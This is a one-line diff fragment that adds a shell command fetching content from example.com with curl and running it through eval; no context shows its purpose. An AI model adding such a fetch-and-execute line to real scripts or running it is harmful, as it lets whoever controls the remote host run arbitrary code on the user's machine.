@@ -1,0 +1,1 @@
+eval "$(curl example.com/x)"
